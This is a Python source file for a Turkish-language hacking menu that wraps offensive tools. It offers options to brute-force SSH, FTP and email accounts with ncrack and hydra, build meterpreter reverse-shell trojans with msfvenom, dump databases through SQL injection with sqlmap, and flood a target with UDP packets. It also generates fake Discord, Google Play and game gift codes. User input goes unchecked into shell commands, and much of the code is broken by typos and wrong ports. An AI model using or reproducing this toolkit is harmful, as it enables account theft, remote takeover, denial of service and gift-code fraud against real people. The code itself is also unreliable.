#!/usr/bin/env python
import os
import py_compile
import random 
import hashlib
import socket
import urllib.request
import youtube_dl

os.system("apt-install figlet")
os.system("apt-install chkrootkit")
os.system("clear")
os.system("figlet Sexettin Tools v5")

print('''

1-) Exploit Tarama Aracı

2-) Güvenlik Duvarı Tespit Aracı

3-) Kaba Kuvvet Saldırısı Aracı

4-) Port Tarama Aracı

5-) Rootkit Tarama Aracı

6-) Trojan Oluşturma Aracı

7-) Zaafiyet Analiz Aracı

8-) Zaafiyet Analiz Aracı v2

9-) Wordlist Oluşturma Aracı

10-) Hedef Ip Vpn Kontrol Aracı

11-) Mac Adresi Değiştirme Aracı

12-) Wordpress Tarama Aracı

13-) Derleme Aracı

14-) Veritabanı Çalma Aracı 

15-) Yeraltı

16-) Kaba Kuvvet Saldırısı v2 (demo)

17-) Md5 Encoder Aracı

18-) DDOS aracı

19-) Site Kaynak Kodu Çekme Aracı

20-) İş görür

21-) Metforaya bağlan 




''')
sexettinsecim = input("Seçiminizi yazınız > ")

if(sexettinsecim=="1"):
	os.system("apt-get install figlet")
	os.system("clear")
	os.system("figlet Sexettin")
	anahtarkelime = input("Anahtar Kelime Girin: ")
	os.system("searchsloit " + anahtarkelime)

	istek = input("Yeni arama yapmak ister misiniz? (y/n): ")

	if(istek =="y"):
		os.system("python3 sexettin-toolsv1.py")
	elif(istek =="n"):
		print("Görüşürüüüz :') ")

	


elif(sexettinsecim=="2"):
	os.system("apt-get install figlet")
	os.system("clear")
	os.system("figlet Sexettin")
	print('''

Güvenlik Duvarı Tespit Etme Aracına Hoş Geldin Kanka :D

	''')


	guvenliksite = input("Site Adresini Girin: ")
	os.system("wafw00f " + guvenliksite)


elif(sexettinsecim=="3"):
	os.system("apt-get install figlet")
	os.system("clear")
	os.system("figlet Sexettin")
	print('''
Kaba Kuvvet Aracına Hoş Geldin :)

1-) FTP
2-) SSH
3-) TELNET
4-) HTTP
5-) SMB
6-) RDP
7-) SIP
8-) REDİS
9-) VNC
10-) PostgreSQL
11-) SQL

''')


	islemno = input("İşlem Numarasını Giriniz: ")
	hedefip = input("Hedef Ip Giriniz: ")
	kadi = input("Kullanıcı Adı Dosya Yolu: ")
	sifre = input("Şifrelerin Bulunduğu Dosya Yolu: ")

	if(islemno=="1"):
		os.system("nrack -p 21 -u " + kadi + " -P " + sifre + " " + hedefip)
	elif(islemno=="2"):
		os.system("ncrack -p 22 -u " + kadi + " -P " + sifre + " " + hedefip)
	elif(islemno=="3"):
		os.system("ncrack -p 23 -u " + kadi + " -P " + sifre + " " + hedefip)
	elif(islemno=="4"):
		os.system("ncrack -p 24 -u " + kadi + " -P " + sifre + " " + hedefip)
	elif(islemno=="5"):
		os.system("ncrack -p 25 -u " + kadi + " -P " + sifre + " " + hedefip)
	elif(islemno=="6"):
		os.system("ncrack -p 26 -u " + kadi + " -P " + sifre + " " + hedefip)
	elif(islemno=="7"):
		os.system("ncrack -p 27 -u " + kadi + " -P " + sifre + " " + hedefip)
	elif(islemno=="8"):
		os.system("ncrack -p 28 -u " + kadi + " -P " + sifre + " " + hedefip)
	elif(islemno=="9"):
		os.system("ncrack -p 29 -u " + kadi + " -P " + sifre + " " + hedefip)
	elif(islemno=="10"):
		os.system("ncrack -p 30 -u " + kadi + " -P " + sifre + " " + hedefip)
	elif(islemno=="11"):
		os.system("ncrack -p 31 -u " + kadi + " -P " + sifre + " " + hedefip)
	else:
		print("Hatalı seçim yaptın >:(")



elif(sexettinsecim=="4"):
	os.system("apt-get install figlet")
	os.system("clear")
	os.system("figlet Sexettin")
	print('''



Port Tarama Aracına Hoşgeldin

1-) Hızlı Tarama

2-) Servis ve Versiyon Bilgisi

3-) İşletim Sistemi Bilgisi


''')



	islemno = input("İşlem Numarasını Girin: ")
	if(islemno=="1"):
		hedefip = input("Hedef ip Giriniz: ")
		os.system=("nmap " +hedefip)

	elif(islemno=="2"):
		hedefip = input("Hedef ip Giriniz: ")
		os.system("nmap -sS -sV " +hedefip)

	elif(islemno=="3"):
		hedefip = input("Hedef ip Giriniz: ")
		os.system("nmap -0 " +hedefip)


	else:
		print("Hatalı seçim yaptın kanka")



elif(sexettinsecim=="5"):
	os.system("apt-get install chkrootkit")
	os.system("apt-get install figlet")
	os.system("clear")
	os.system("figlet Sexettin")
	print('''

Rootkit Tarama Aracına Hoşgeldiniz!


''')
	os.system("chkrootkit")


elif(sexettinsecim=="6"):
	os.system("apt-get install figlet")
	os.system("clear")
	os.system("figlet Sexettin")
	print('''

Trojan OLuşturma Aracına Hoş Geldin Kanka :D

	''')

	ip = input("Local veya Dış Ip giriniz: ")
	port = input("Port Girin: ")
	print('''
1-) windows/meterpreter/reverse_tcp
2-) windows/meterpreter/reverse_http
3-) windows/meterpreter/reverse_https
	''')
	payload = input("Payload No Giriniz: ")
	kayityeri = input("Kayıt Yerini Giriniz: ")

	if(payload=="1"):
		os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + ip + " LPORT=" + port + " -f exe -o " + kayityeri)
	elif(payload=="2"):
		os.system("msfvenom -p windows/meterpreter/reverse_http LHOST=" + ip + " LPORT=" + port + " -f exe -o " + kayityeri)
	elif(payload=="3"):
		os.system("msfvenom -p windows/meterpreter/reverse_https LHOST=" + ip + " LPORT=" + port + " -f exe -o " + kayityeri)
	elif(payload=="4"):
		os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST=" + ip + " LPORT=" + port + " -f apk -o " + kayityeri)
	elif(payload=="5"):
		os.system("msfvenom -p android/meterpreter/reverse_http LHOST=" + ip + " LPORT=" + port + " -f apk -o " + kayityeri)
	elif(payload=="6"):
		os.system("msfvenom -p android/meterpreter/reverse_https LHOST=" + ip + " LPORT=" + port + " -f apk -o " + kayityeri)
	else:
		print("Hatalı Seçim Yaptın Kanka ")
	
elif(sexettinsecim=="7"):
	os.system("apt-get install figlet")
	os.system("clear")
	os.system("figlet Sexettin")

	print('''

Zaafiyet Analizi Aracına Hoşgeldiniz


	''')

	hedefzaafiyetip = input("Hedef ip giriniz: ")
	os.system("nikto -h " +hedefzaafiyetip)

elif(sexettinsecim=="8"):
	os.system("apt-get install figlet")
	os.system("apt-get install lynis")
	os.system("clear")
	os.system("figlet Sexettin")
	print('''

Hoşgeldiniz Zaafiyet analizi v2 aracı başlatılıyor...
	''')

	os.system("lynis audit system")

	print('''

ANALİZ SONUCU

	''')





elif(sexettinsecim=="9"):
	os.system("apt-get install figlet")
	os.system("clear")
	os.system("figlet Sexettin")
	print('''

En Kısa Yoldan Wordlist Oluşturma Toolu


''')
	minc = input("Minimum kaç haneli olsun? ")
	maxc = input("Maximum kaç haneli olsun? ")
	icindekikelime = input("İçinde hangi kelimeler/rakamlar bulunsun? ")
	dosyaadic = input("Dosyanın adı ne olsun? (uzantısı ile beraber yazınız) ")
	os.system("crunch "+minc+" "+maxc+" "+icindekikelime+" -o "+dosyaadic)

elif(sexettinsecim=="10"):
	os.system("apt-get install figlet")
	os.system("clear")
	os.system("figlet Sexettin")
	print('''

Vpn Kontrol Aracına Hoşgeldiniz!

''')

	vpnhedefip = input("Hedef Ip Giriniz > ")
	os.system("ike-scan "+vpnhedefip)




elif(sexettinsecim=="11"):
	os.system("apt-get install figlet")
	os.system("clear")
	os.system("figlet Sexettin")
	print('''

MAC Adresi Değiştirme Aracına Hoşgeldiniz!

1-) Mac Adresini Random Belirle

2-) Mac Adresini Kendin Belirle

3-) Mac Adresini Orjinale Döndür

	''')

	macislem = input("İşlem Numarasını Yazınız > ")
	if(macislem=="1"):
		os.system("ifconfig eth0 down")
		os.system("macchanger -r eth0")
		os.system("ifconfig eth0 up")
		print("\033[92mYeni mac adresi random belirlendi!]")


	elif(macislem=="2"):
		macadres = input("Yeni Mac Adresini Giriniz > ")
		os.system("ifconfig eth0 down")
		os.system("macchanger --mac "+macadres+" eth0")
		os.system("ifconfig eth0 up")
		print("\033[92mYeni mac adresi elle belirlendi!]")


	elif(macislem=="3"):
		os.system("ifconfig eth0 down")
		os.system("macchanger -p eth0")
		os.system("ifconfig eth0 up")
		print("\033[92mMac Adresi Orjinale Döndürüldü!]")
	else:
		print("Hatalı Seçim Yaptınız")
	


elif(sexettinsecim=="12"):
	os.system("apt-get install figlet")
	os.system("clear")
	os.system("figlet Sexettin")
	print('''

WORDPRESS Tarama Tool

1-) Hızlı Tarama

2-) Eklenti Tarama

3-) Tema Tarama 

4-) Yönetici Kullanıcı Adı Tarama

	''')

	wpislem = input("İşlem Numarası Giriniz > ")

	if(wpislem=="1"):
		sitewp = input("Site Adresi Giriniz > ")
		os.system("wpscan --url " +sitewp)
	elif(wpislem=="2"):
		sitewp = input("Site Adresi Giriniz > ")
		os.system("wpscan --url " +sitewp+ " --enumerate p")
	elif(wpislem=="3"):
		sitewp = input("Site Adresi Giriniz > ")
		os.system("wpscan --url " +sitewp+ " --enumerate t")
	elif(wpislem=="4"):
		sitewp = input("Site Adresi Giriniz > ")
		os.system("wpscan --url " +sitewp+ " --enumerate u")

	else:
		print("Hatalı Seçim Yaptınız")



elif(sexettinsecim=="13"):

	os.system("apt-get install figlet")
	os.system("clear")
	os.system("figlet Sexettin")
	print('''

Derleme Aracına Hoşgeldiniz!

	''')

	derle = input("Program Yolunu Giriniz > ")

	py_compile.compile(derle)




elif(sexettinsecim=="14"):

	os.system("apt-get install figlet")
	os.system("clear")
	os.system("figlet Sexettin")

	print('''

1-) Açıklı Siteyi Biliyorum

2-) Açıklı Site Ve Veritabanı Adını Biliyorum

3-) Açıklı Siteyi Veritabanı Adını Ve Tablo Adını Biliyorum

örnek link: http://www.suesupriano/article.php?id=25

	''')

	sqlsecim = input("Seçim yapınız > ")
	if(sqlsecim=="1"):
		aciklilink = input("site gir")
		os.system("sqlmap -u "+aciklilink+" --dbs --random-agent")

	elif(sqlsecim=="2"):
		aciklilink = input("Açıklı siteyi girin > ")
		averitabani = input("veritabanı Adını Giriniz > ")
		os.system("sqlmap -u "+aciklilink+" -D "+averitabani+" --tables --random-agent")


	elif(sqlsecim=="3"):
		aciklilink = input("Açıklı siteyi girin > ")
		averitabani = input("veritabanı Adını Giriniz > ")
		tablo = input("Tablo Adını Giriniz > ")
		os.system("sqlmap -u "+aciklilink+" -D "+averitabani+" - T "+tablo+" --columns --random-agent")


	

	else:
		print("Hatalı Seçim Yaptın Kanka")



elif(sexettinsecim=="15"):
	os.system("apt-get install figlet")
	os.system("clear")
	os.system("figlet Sexettinin yeraltIsI")
	print('''

YERALTINA HOŞGELDİN DOST ;)


bunlar herhangi bişey çağırmıyor,kendi kodladığım generatorler
her yerde çalışır

1-) Dic0rd nitro generator

2-) Şifre Oluşturucu

3-) Şifre OLuşturucu v2

4-) G00gle pIay kod generator

5-) P3bg u¢ generator

6-) P3bg u¢ generatorv2 

7-) P3bg u¢ generatorv3 

8-) P3bg u¢ generatorv4

9-) P3bg u¢ generatorv5

10-) Kullanıcı Adı ile Hesap Bulma

11-) T¢ Son 2 Hane Bulma

12-) An0nimSMS (demo)

13-) Telefon Numarasından Şehir Bulma (TRde demo)


	''')
	yeraltisecim = input("Sizi Nereye Alayım? ")
	if(yeraltisecim=="1"):



		chars = "abcdefghijklmnoprstuvyzqwABCDEFGHIJKLMNOPRSTUVYQW1234567890"

		while 1:
			password_sayi = int(input("Kaç tane oluşturulsun? "))
			for x in range(0,password_sayi):
				password = ""
				for x in range(16):
					password_sayi = random.choice(chars)
					password	= password + password_sayi
				print("discord.gift/"+password)
			
	elif(yeraltisecim=="2"):
		import random 


		chars = "abcdefghijklmnoprstuvyzqwABCDEFGHIJKLMNOPRSTUVYQW1234567890.!+-"

		while 1:
			password_uzunluk = int(input("Ne kadar uzunlukta olsun? "))
			password_sayi = int(input("Kaç tane şifre oluşturulsun? "))
			for x in range(0,password_sayi):
				password = ""
				for x in range(0,password_uzunluk):
					password_sayi = random.choice(chars)
					password	= password + password_sayi
				print("Senin için oluşturduğum şifre :" , password)

	elif(yeraltisecim=="3"):
		import random 


		chars = input("İçinde olmasını istediğiniz harf rakam sembol vb giriniz: ")
		while 1:
			password_uzunluk = int(input("Ne kadar uzunlukta olsun? "))
			password_sayi = int(input("Kaç tane şifre oluşturulsun? "))
			for x in range(0,password_sayi):
				password = ""
				for x in range(0,password_uzunluk):
					password_sayi = random.choice(chars)
					password	= password + password_sayi
				print("Senin için oluşturduğum şifre :" , password)


	elif(yeraltisecim=="4"):

		chars = "ABCDEFGHIJKLMNOPRSTUVYQW1234567890"

		while 1:
			password_sayi = int(input("Kaç tane oluşturulsun? "))
			for x in range(0,password_sayi):
				password = ""
				for x in range(16):
					password_sayi = random.choice(chars)
					password	= password + password_sayi
				print(password)


	elif(yeraltisecim=="5"):

		chars = "abcdefghijklmnoprstuvyzqwABCDEFGHIJKLMNOPRSTUVYQW1234567890"

		while 1:
			password_sayi = int(input("Kaç tane oluşturulsun? "))
			for x in range(0,password_sayi):
				password = ""
				for x in range(18):
					password_sayi = random.choice(chars)
					password	= password + password_sayi
				print(password)



	
	elif(yeraltisecim=="6"):

		chars = "abcdefghijklmnoprstuvyzqwABCDEFGHIJKLMNOPRSTUVYQW1234567890"

		while 1:
			password_sayi = int(input("Kaç tane oluşturulsun? "))
			for x in range(0,password_sayi):
				password = ""
				for x in range(16):
					password_sayi = random.choice(chars)
					password	= password + password_sayi
				print("eKkVp-"+password)




	elif(yeraltisecim=="7"):

		chars = "abcdefghijklmnoprstuvyzqwABCDEFGHIJKLMNOPRSTUVYQW1234567890"

		while 1:
			password_sayi = int(input("Kaç tane oluşturulsun? "))
			for x in range(0,password_sayi):
				password = ""
				for x in range(13):
					password_sayi = random.choice(chars)
					password	= password + password_sayi
				print("rHira"+password)



	elif(yeraltisecim=="8"):

		chars = "abcdefghijklmnoprstuvyzqwABCDEFGHIJKLMNOPRSTUVYQW1234567890"

		while 1:
			password_sayi = int(input("Kaç tane oluşturulsun? "))
			for x in range(0,password_sayi):
				password = ""
				for x in range(13):
					password_sayi = random.choice(chars)
					password	= password + password_sayi
				print("pT42C"+password)

	elif(yeraltisecim=="9"):

		chars = "abcdefghijklmnoprstuvyzqwABCDEFGHIJKLMNOPRSTUVYQW1234567890"

		while 1:
			password_sayi = int(input("Kaç tane oluşturulsun? "))
			for x in range(0,password_sayi):
				password = ""
				for x in range(13):
					password_sayi = random.choice(chars)
					password	= password + password_sayi
				print("RJNsK"+password)


	elif(yeraltisecim=="10"):
		hesapbul = input("Kullanıcı Adı Giriniz > ")
		print("")
		print("\033[92mFACEBOOK >  ","https://www.facebook.com/"+hesapbul)
		print("")
		print("INSTAGRAM >  ","https://www.instagram.com/"+hesapbul)
		print("")
		print("TWITTER >  ","https://www.twitter.com/"+hesapbul)
		print("")
		print("YOUTUBE >  ","https://www.youtube.com/"+hesapbul)
		print("")
		print("BLOGGER >  ","https://"+hesapbul+".blogspot.com")
		print("")
		print("REDDIT >  ","https://www.reddit.com/user/"+hesapbul)
		print("")
		print("GITHUB >  ","https://www.github.com/"+hesapbul)
		print("")
		print("STEAM >  ","https://steamcommunity.com/id/"+hesapbul)
		print("")
		print("VK >  ","https://vk.com/"+hesapbul)
		print("")
		print("SPOTIFY >  ","https://open.spotify.com/user/"+hesapbul)
		print("")
		print("WATTPAD >  ","https://www.wattpad.com/user/"+hesapbul)
		print("")
		print("WORDPRESS >  ","https://"+hesapbul+".wordpress.com")
		print("")
		print("PINTEREST >  ","https://www.pinterest.com/"+hesapbul)
		print("")
		print("TUMBLR >  ","https://"+hesapbul+".tumblr.com")
		print("")
		print("FLICKR >  ","https://www.flickr.com/people/"+hesapbul)
		print("")
		print("SOUNDCLOUD >  ","https://soundcloud.com/"+hesapbul)
		print("")


	elif(yeraltisecim=="11"):
		tcno = input("TC Kimlik No İlk 9 Hanesini Giriniz: ")
		a, b, toplamDokuz = 0, 0, 0
		for i in range(9):
		    toplamDokuz = toplamDokuz+int(tcno[i])
		    if i%2 == 0:
		        a = a+7*int(tcno[i])
		    elif i%2 == 1:
		        b = b+int(tcno[i])
		    if i == 8:
		        haneOn = (a-b)%10
		        haneOnBir = (haneOn+toplamDokuz)%10
		        print(tcno+str(haneOn)+str(haneOnBir))

	elif(yeraltisecim=="12"):
		os.system("pip install requests")
		import requests
		print("Günlük 1 mesaj hakkınız vardır numarayı +9055555555555 şeklinde giriniz link koymak yasak karakter sınırı düşüktür")
		telefonno = input("Telefon Numarası Giriniz : ")
		mesaj = input("Mesajınızı Giriniz: ")

		resp = requests.post('https://textbelt.com/text', {
  			'phone': telefonno,
  			'message': mesaj,
  			'key': 'textbelt',
		})
		print(resp.json())


	elif(yeraltisecim=="13"):
		import phonenumbers
		from phonenumbers import geocoder
		numara = input("Numara giriniz +90xxx şeklinde: ")
		telno = phonenumbers.parse(numara)
		print(geocoder.description_for_number(telno,"tr"))


	else:
		print("Hatalı seçim,doğru yaz kanka ")


elif(sexettinsecim=="16"):
	os.system("figlet Sexettin")
	print('''

1-) Email 

2-) Hotmail


''')
	brutev = input("Hangisini Seçiyorsun? ")
	if(brutev=="1"):
		email = input("Hedef Email: ")
		sifre = input("Şifre Dosyası : ")
		os.system("hydra -l %s -P %s -s 465 smtp.gmail.com smtp" % (email, sifre))


	elif(brutev=="2"):
		email = input("Hotmail : ")
		word = input("Şifre Dosyası : ")
		os.system("hydra -l %s -P %s -s 587 smtp.live.com smtp" % (email, word))


elif(sexettinsecim=="17"):
	sifreleyici = hashlib.md5()
	metin = input("Metin Giriniz > ")
	sifreleyici.update(metin.encode("utf-8"))
	cikti = sifreleyici.hexdigest()
	print(" ")
	print("Çıktı > %s" % cikti)


elif(sexettinsecim=="18"):

	hedef_ip = str(input("Hedef ip giriniz > "))
	hedef_port = int(input("Hedef port giriniz > "))
	bytes = random._urandom(1500)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	sayac = 0
	while True:
		sock.sendto(bytes,(hedef_ip, hedef_port))
		sayac = sayac+1
		print("Gönderilen paket: %s" %(sayac))


elif(sexettinsecim=="19"):
	print("Site Adresini https://google.com şeklinde giriniz")
	site_adresi = input("Site Adresini Giriniz > ")
	html = urllib.request.urlopen(site_adresi)
	print(html.read())
	print("\n\nSİTE KODLARI YUKARIDA\n")


elif(sexettinsecim=="20"):
	os.system("python3 iss.py")
elif(sexettinsecim=="21"):
	os.system("python3 metfora.py")
	


else:
	print("\033[91mHatalı seçim,doğru yaz kanka ")


